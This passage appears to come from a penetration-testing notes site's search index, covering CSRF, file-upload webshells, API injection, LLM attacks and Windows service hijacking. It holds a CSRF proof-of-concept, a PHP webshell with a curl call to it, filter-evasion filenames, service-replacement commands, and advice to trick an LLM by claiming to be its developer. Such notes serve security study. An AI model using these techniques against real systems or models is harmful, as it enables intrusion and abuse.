PHP parses the last parameter only - ASP.NET combines both parameters - Node.js / express parses the first parameter only</p>","tags":["web","api"]},{"location":"Web/API%20testing/#in-rest-paths","title":"In REST Paths","text":"<p>URL-encoded special characters can be used to trigger errors or abuse a path traversal on the server's side.</p> <p>For instance, a request made to the server like: <pre><code>GET /edit_profile.php?name=peter\n</code></pre></p> <p>Will result in this server-side request: <pre><code>GET /api/private/users/peter\n</code></pre></p> <p>And can be abused by appending a URL-encoded path traversal payload, for instance <code>peter%2f..%2fadmin</code> which would give: <pre><code>GET /api/private/users/peter/../admin\n</code></pre></p>","tags":["web","api"]},{"location":"Web/API%20testing/#in-structured-data-formats","title":"In Structured Data Formats","text":"<p>Same principle as previous ones but adapted for JSON for instance: <pre><code>POST /myaccount name=peter\",\"access_level\":\"administrator\n</code></pre></p> <p>Would result in: <pre><code>PATCH /users/7312/update {name=\"peter\",\"access_level\":\"administrator\"}\n</code></pre></p>","tags":["web","api"]},{"location":"Web/CSRF/","title":"CSRF","text":""},{"location":"Web/CSRF/#conditions","title":"Conditions","text":"<p>The target should correspond to the following conditions for CSRF to be possible.</p> <ul> <li>There must be a relevant action: any privileged action or any action on user-specific data.</li> <li>The session handling must be cookie-based: no other mechanism that tracks sessions or validates user requests should be in place.</li> <li>There should not be any unpredictable request parameter: the attacker should be able to determine/guess the value of each parameter.</li> </ul>"},{"location":"Web/CSRF/#craft-a-payload","title":"Craft a Payload","text":"<p>Using Burp's CSRF PoC Generator.</p> <p>To generate a payload based on a request that will be tested: Right Click -&gt; Engagement Tools -&gt; Generate CSRF PoC</p>"},{"location":"Web/CSRF/#example","title":"Example","text":"<pre><code>&lt;html&gt;\n &lt;body&gt;\n    &lt;form action=\"https://vulnerable.com/email/change\" method=\"POST\"&gt;\n      &lt;input type=\"hidden\" name=\"email\" value=\"pwned@evil-user.net\" /&gt;\n    &lt;/form&gt;\n    &lt;script&gt;\n      document.forms[0].submit();\n    &lt;/script&gt;\n &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>"},{"location":"Web/CSRF/#csrf-tokens","title":"CSRF Tokens","text":"<p>Unique, secret and unpredictable value shared to the client.  They are then included by the client in requests that are considered sensitive, and validated by the server.</p> <p>CSRF Tokens can be in the form of a hidden field in a form but also as a HTTP headers and others.</p>"},{"location":"Web/CSRF/#common-csrf-validation-flaws","title":"Common CSRF Validation Flaws","text":""},{"location":"Web/CSRF/#validation-depends-on-method","title":"Validation Depends on Method","text":"<p>Some applications correctly validate the token when the request uses the POST method but skip the validation when the GET method is used.</p> <p>For instance, try crafting a GET request passing the body parameters as query strings.</p>"},{"location":"Web/CSRF/#validation-depends-on-token-being-present","title":"Validation Depends on Token Being Present","text":"<p>Some applications correctly validate the token when it is present but skip the validation if the token is omitted.</p> <p>Try removing the token -&gt; the entire parameter, not just the value.</p>"},{"location":"Web/CSRF/#token-not-tied-to-user-session","title":"Token not Tied to User Session","text":"<p>Some applications do not validate that the token belongs to the same session as the user who is making the request.</p> <p>Try using the attacker's token in the CSRF payload.</p>"},{"location":"Web/CSRF/#token-is-tied-to-a-non-session-cookie","title":"Token is Tied to a Non-Session Cookie","text":"<p>Some applications do not tie the token to the same cookie that is used to track sessions. There are then 2 cookies: one for sessions handling and another one for CSRF protection.</p> <p>TODO</p>"},{"location":"Web/CSRF/#token-is-simply-duplicated-in-a-cookie","title":"Token is Simply Duplicated in a Cookie","text":"<p>TODO</p>"},{"location":"Web/CSRF/#samesite-cookie-restrictions","title":"<code>SameSite</code> Cookie Restrictions","text":"<p>A browser security that determines when a website's cookies are included in request that originate from other websites.</p> <p>The context of a <code>SameSite</code> cookie is TLD+1 (Top Level Domain). For instance, in <code>app.example.com</code>, <code>example.com</code> is the context. In addition, the URL scheme is important -&gt; <code>http://</code> \u2260 <code>https://</code></p> <p>Major browsers support 3 <code>SameSite</code> restriction levels: - Strict: The cookie will not be included if the target site does not match the current site. - Lax: Cookie is only included in <code>GET</code> requests that result from a top-level domain navigation (i.e. clicking on a link). - None: <code>SameSite</code> restrictions are disabled.</p> <p>Default behaviour is <code>None</code> on major browsers at the exception of Chrome which defaults to <code>Lax</code>.</p>"},{"location":"Web/CSRF/#bypassing-lax-restrictions-using-get","title":"Bypassing Lax Restrictions Using <code>GET</code>","text":"<p>When it is possible to use GET requests to perform actions, CSRF attacks may still be possible while involving a top-level navigation.</p> <p>For instance: <pre><code>&lt;script&gt;\n    document.location = 'https://vulnerable.com/account/transfer-payment?recipient=hacker&amp;amount=1000000';\n&lt;/script&gt;\n</code></pre></p>"},{"location":"Web/CSRF/#bypassing-restrictions-using-on-site-gadgets","title":"Bypassing Restrictions Using On-Site Gadgets","text":"<p>It is sometimes possible to bypass the <code>SameSite=Strict</code> restriction by leveraging gadgets on the page. For instance, a client-side redirect with an attacker-controllable input as URL.</p> <p>Look for places where controllable data is used to build URLs.</p>"},{"location":"Web/File%20Upload%20Vulnerabilities/","title":"File Upload Vulnerabilities","text":""},{"location":"Web/File%20Upload%20Vulnerabilities/#techniques-for-uploading-a-webshell","title":"Techniques for Uploading a Webshell","text":""},{"location":"Web/File%20Upload%20Vulnerabilities/#basic-webshell-upload-no-countermeasures","title":"Basic Webshell Upload (No Countermeasures)","text":"<ol> <li>Upload a legitimate image to see where the webserver saves the file.</li> <li>Upload a PHP webshell and access the file with a GET request.</li> <li>Use a parameter query with your command to be executed by the OS.</li> </ol>"},{"location":"Web/File%20Upload%20Vulnerabilities/#example-of-a-basic-webshell","title":"Example of a Basic Webshell","text":"<p><pre><code>&lt;?php system($_GET['cmd']); ?&gt;\n</code></pre> This script takes a GET parameter and executes it using the system command.</p>"},{"location":"Web/File%20Upload%20Vulnerabilities/#example-of-a-query","title":"Example of a Query","text":"<pre><code>curl -X GET https://&lt;target_url&gt;/files/avatars/basic-web-shell.php?cmd=pwd\n</code></pre>"},{"location":"Web/File%20Upload%20Vulnerabilities/#using-htaccess","title":"Using .htaccess","text":"<p>.htaccess is a configuration file for a directory. You can overwrite it to bypass security measures like file extension checking.</p>"},{"location":"Web/File%20Upload%20Vulnerabilities/#lab-example","title":"Lab Example","text":"<ul> <li><code>.php</code> was blocked, so the webserver did not allow PHP file uploads.</li> <li>Created a <code>.htaccess</code> file, uploaded it, and allowed the execution of PHP files using the extension \".213dz\" with the mod_php module:</li> </ul> <pre><code># Enable PHP file execution for mod_php\nAddHandler application/x-httpd-php .213hz\n\n# Enable PHP file execution for PHP-FPM\n&lt;FilesMatch \\.php$&gt;\n    SetHandler \"proxy:unix:/path/to/php-fpm.sock|fcgi://localhost/\"\n&lt;/FilesMatch&gt;\n\n&lt;FilesMatch \"\\.php$\"&gt;\n    Require all granted\n&lt;/FilesMatch&gt;\n</code></pre> <p>Note: Change the HTTP content-type in the body of the request to \"Content-Type: plain/text\". Now you can upload your PHP file with the extension \".213hz\".</p>"},{"location":"Web/File%20Upload%20Vulnerabilities/#denial-of-service-dos","title":"Denial of Service (DOS)","text":"<ol> <li>Check if there is a size limit on the uploaded files.</li> <li>If not, try to upload the largest file possible.</li> <li>The goal is to fill up the webserver's disk space, causing it to crash.</li> </ol>"},{"location":"Web/File%20Upload%20Vulnerabilities/#directory-traversal","title":"Directory Traversal","text":"<ul> <li>Sometimes you can use this technique to upload a file to another directory where PHP execution is allowed.</li> <li>Use URL path encoding in Burp Repeater to try to save a file in a subdirectory of the intended directory.</li> </ul>"},{"location":"Web/File%20Upload%20Vulnerabilities/#obfuscation-techniques","title":"Obfuscation Techniques","text":"<p>Sometimes, the PHP code that checks the legitimacy of your file is not coded correctly. Depending on the code, these obfuscation techniques could work:</p> <ul> <li>Multiple Extensions: Depending on the algorithm used to parse the filename, the following file may be interpreted as either a PHP file or a JPG image: <code>exploit.php.jpg</code>.</li> <li>Trailing Characters: Some components will strip or ignore trailing whitespaces, dots, and similar characters: <code>exploit.php.</code>.</li> <li>URL Encoding: Use URL encoding (or double URL encoding) for <code>\".\"</code>, <code>\"../\"</code>, or <code>\"..\"</code>. If the value isn't decoded when validating the file extension, but is later decoded server-side, this can allow you to upload malicious files that would otherwise be blocked: <code>exploit%2Ephp</code>.</li> <li>Semicolons or Null Byte Characters: Add semicolons or URL-encoded null byte characters before the file extension. If validation is written in a high-level language like PHP or Java, but the server processes the file using lower-level functions in C/C++, this can cause discrepancies in what is treated as the end of the filename: <code>exploit.php;.jpg</code> or <code>exploit.php%00.jpg</code>.</li> <li>Multibyte Unicode Characters: Use multibyte unicode characters, which may be converted to null bytes and dots after unicode conversion or normalization. Sequences like <code>xC0 x2E</code>, <code>xC4 xAE</code>, or <code>xC0 xAE</code> may be translated to <code>x2E</code> if the filename is parsed as a UTF-8 string but then converted to ASCII characters before being used in a path.</li> </ul>"},{"location":"Web/Web%20LLM%20Attacks/","title":"Web LLM Attacks","text":""},{"location":"Web/Web%20LLM%20Attacks/#detecting-llm-vulnerabilities","title":"Detecting LLM Vulnerabilities","text":"<ol> <li>Identify the LLM's inputs, including both direct (such as a prompt) and indirect (such as training data) inputs.</li> <li>Work out what data and APIs the LLM has access to.</li> <li>Probe this new attack surface for vulnerabilities.</li> </ol>"},{"location":"Web/Web%20LLM%20Attacks/#exploiting-llm-apis","title":"Exploiting LLM APIs","text":""},{"location":"Web/Web%20LLM%20Attacks/#common-workflow","title":"Common Workflow","text":"<ol> <li>The client calls the LLM with the user's prompt.</li> <li>The LLM detects that a function needs to be called and returns a JSON object containing arguments adhering to the external API's schema.</li> <li>The client calls the function with the provided arguments.</li> <li>The client processes the function's response.</li> <li>The client calls the LLM again, appending the function response as a new message.</li> <li>The LLM calls the external API with the function response.</li> <li>The LLM summarizes the results of this API call back to the user.</li> </ol>"},{"location":"Web/Web%20LLM%20Attacks/#mapping-the-attack-surface","title":"Mapping the Attack Surface","text":"<p>Ask the LLM directly which APIs it has access to, and ask more details about the interesting APIs.</p> <p>If the LLM is not cooperative, trick it by providing misleading context. For instance claim to be the LLM's developer.</p>"},{"location":"Web/Web%20LLM%20Attacks/#chaining-vulnerabilities","title":"Chaining Vulnerabilities","text":"<p>Keep in mind that a second order vulnerability can hide behind the LLM. For instance, an API that takes a file name as an input could be vulnerable to a path traversal attack.</p>"},{"location":"Windows/Service%20Binary%20Hijacking/","title":"Service Binary Hijacking","text":""},{"location":"Windows/Service%20Binary%20Hijacking/#bad-permissions","title":"Bad Permissions","text":"<p>A service's binary is not properly protected</p> <ol> <li> <p>List services, look for any service that isn't in <code>C:\\Windows\\System32</code>: <pre><code>wmic service get name,pathname |  findstr /i /v \"C:\\Windows\\\\\"\n</code></pre> <pre><code>Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}\n</code></pre></p> </li> <li> <p>Check permissions: <pre><code>icacls &lt;path&gt;\n</code></pre></p> </li> <li> <p>Cross-compile and replace the service binary (don't forget to backup the original)</p> </li> <li> <p>Restart the service or reboot the machine: <pre><code># Restart the service\nnet stop &lt;service&gt;\nnet start &lt;service&gt;\n\nStop-Service &lt;service&gt;\nStart-Service &lt;service&gt;\n\n# Reboot the machine\nshutdown /r /t 0\n</code></pre></p> </li> </ol>"},{"location":"Windows/Service%20Binary%20Hijacking/#unquoted-service-paths","title":"Unquoted Service Paths","text":"<p>The executable path of a service is not quoted</p>"},{"location":"Windows/Service%20Binary%20Hijacking/#in-practice","title":"In practice","text":"<ol> <li> <p>List services, and look for any service with an executable that has spaces &amp; is unquoted (see above).</p> </li> <li> <p>Check the permissions of each potential directory w/ <code>icacls</code>.</p> </li> <li> <p>Replace the executable with a malicious one, and restart the service (see above).</p> </li> </ol>"},{"location":"Windows/Service%20DLL%20Hijacking/","title":"Service DLL Hijacking","text":""},{"location":"Windows/Service%20DLL%20Hijacking/#in-practice","title":"In practice","text":"<ol> <li> <p>List services, look for any service that isn't in <code>C:\\Windows\\System32</code>: <pre><code>Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}\n</code></pre></p> </li> <li> <p>Use <code>ProcMon</code> to search for the service</p> </li> <li> <p>While procmon is running, restart the service and find the CreateFile calls</p> </li> <li> <p>Look at the PATH to match the paths used in the CreateFile calls</p> </li> <li> <p>If one of the paths is writeable, replace the DLL. Easiest way is to use msfvenom.</p> </li> </ol>"}]}